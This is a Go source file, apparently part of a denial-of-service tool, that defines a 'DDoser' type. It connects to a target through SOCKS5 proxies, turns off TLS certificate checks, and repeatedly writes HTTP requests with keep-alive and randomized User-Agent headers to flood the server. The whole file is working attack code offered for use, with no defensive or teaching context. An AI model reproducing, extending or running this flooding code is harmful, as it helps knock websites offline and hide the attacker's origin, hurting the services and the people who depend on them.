package main

import (
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"time"

	"golang.org/x/net/proxy"
)

type DDoser struct {
	Conn    net.Conn
	Request *http.Request
}

func NewDDoser(req *http.Request, port, socks5 string) (*DDoser, error) {
	var conn net.Conn

	// Set keep alive
	req.Header.Set("Connection", "keep-alive")

	address := fmt.Sprintf("%s:%s", req.URL.Hostname(), port)

	// Native official proxy
	client, error := proxy.SOCKS5("tcp", socks5, nil, &net.Dialer{
		Timeout:   5 * time.Second,
		KeepAlive: 5 * time.Second,
	})

	if error != nil {
		return nil, error
	}

	conn, error = client.Dial("tcp", address)
	if error != nil {
		return nil, error
	}

	if req.URL.Scheme == "https" {
		conn = tls.Client(conn, &tls.Config{InsecureSkipVerify: true})
	}

	return &DDoser{conn, req}, nil
}

func (d *DDoser) Do(userAgents []string, n int) {
	defer d.Conn.Close()
	for i := 0; i < n; i++ {
		d.Request.Header.Set("User-Agent", random(userAgents))
		d.Request.Write(d.Conn)
	}
}
